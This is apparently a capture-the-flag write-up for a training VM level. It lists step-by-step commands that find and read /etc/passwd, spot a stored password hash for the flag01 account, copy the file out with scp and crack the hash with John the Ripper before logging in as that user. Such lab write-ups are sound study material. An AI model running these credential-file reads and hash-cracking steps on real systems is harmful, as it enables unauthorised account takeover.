# level01

## Steps

1. __Action__ (Guest): since our goal is to find passwords, we find the list
    of password files the current user can read
    ```sh
    find / -name "passwd" -perm -u=r 2>/dev/null
    ```

2. __Observation__ (Guest): the previous command reveals password files
    ```
    /etc/cron.daily/passwd
    /etc/init.d/passwd
    /etc/pam.d/passwd
    /etc/passwd
    /usr/bin/passwd
    /usr/share/doc/passwd
    /usr/share/lintian/overrides/passwd
    /rofs/etc/cron.daily/passwd
    /rofs/etc/init.d/passwd
    /rofs/etc/pam.d/passwd
    /rofs/etc/passwd
    /rofs/usr/bin/passwd
    /rofs/usr/share/doc/passwd
    /rofs/usr/share/lintian/overrides/passwd
    ```

3. __Action__ (Guest): we check the contents of the primary file containing
    information about user accounts
    ```sh
    cat /etc/passwd
    ```

4. __Observation__ (Guest): the previous command reveals an abnormality at
    the `flag01` line
    ```
    ...
    flag00:x:3000:3000::/home/flag/flag00:/bin/bash
    flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
    ...
    ```

5. __Action__ (Host): we copy the password file on our container
    to manipulate it
    ```sh
    scp -P 4242 level01@192.168.56.101:/etc/passwd ./level01_passwd
    ```

6. __Action__ (Host): in our container, crack the password
    ```sh
    john level01_passwd --show
    ```

7. __Observation__ (Host): the previous command reveals the cracked password
    ```
    flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

    1 password hash cracked, 0 left
    ```

8. __Action__ (Guest): log in as the `flag01` user
    ```sh
    su flag01
    ```

9. __Observation__ (Guest): we're invited to launch the command `getflag`
    ```
    Don't forget to launch getflag !
    ```

10. __Action__ (Guest): get the flag
    ```sh
    getflag
    ```
